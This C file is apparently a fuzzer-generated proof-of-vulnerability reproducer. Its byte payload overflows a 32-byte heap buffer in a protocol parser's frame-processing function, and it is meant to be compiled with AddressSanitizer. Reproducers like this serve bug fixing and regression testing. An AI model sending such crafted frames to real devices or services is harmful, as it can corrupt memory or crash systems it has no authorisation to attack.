/**
 * ============================================================================
 * AeroHarness Proof-of-Vulnerability (PoV) Reproducer
 * ============================================================================
 * Target API:         protocol_process_frame
 * Vulnerability Type: heap-buffer-overflow
 * Classification:     CWE-122 (Heap-based Buffer Overflow)
 * Access Details:     WRITE (32 bytes)
 * ============================================================================
 * Reproduction Instructions:
 *   clang -fsanitize=address,undefined -g -O1 -I. PoV_protocol_process_frame_heap-buffer-overflow.c target_source.c -o pov_bin
 *   ./pov_bin
 * ============================================================================
 */

#include <stdio.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <stdlib.h>

#include "protocol_parser.h"

/* Hardware MMIO Mock Stubs */
uint32_t hw_read_reg32(uint32_t addr) {
    (void)addr;
    return 0x00000001; // Return ready status
}

void hw_write_reg32(uint32_t addr, uint32_t val) {
    (void)addr;
    (void)val;
}

/* Exact crash-triggering input payload (Minimised by AeroHarness) */
static const uint8_t g_crash_payload[] = {
    0xA5, 0x5A, 0x04, 0x00, 0x10, 0x00, 0xAA, 0x20, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41
};
static const size_t g_crash_payload_len = sizeof(g_crash_payload);

int main(int argc, char **argv) {
    printf("[*] AeroHarness PoV Reproducer running...\n");
    printf("[*] Target API: protocol_process_frame\n");
    printf("[*] Payload Size: %zu bytes\n", g_crash_payload_len);

    protocol_context_t ctx;
    memset(&ctx, 0, sizeof(ctx));
    protocol_init(&ctx, 0x12345678);

    printf("[*] Invoking target API with crafted input...\n");
    int res = protocol_process_frame(&ctx, g_crash_payload, g_crash_payload_len);

    printf("[!] Returned code: %d\n", res);
    return 0;
}
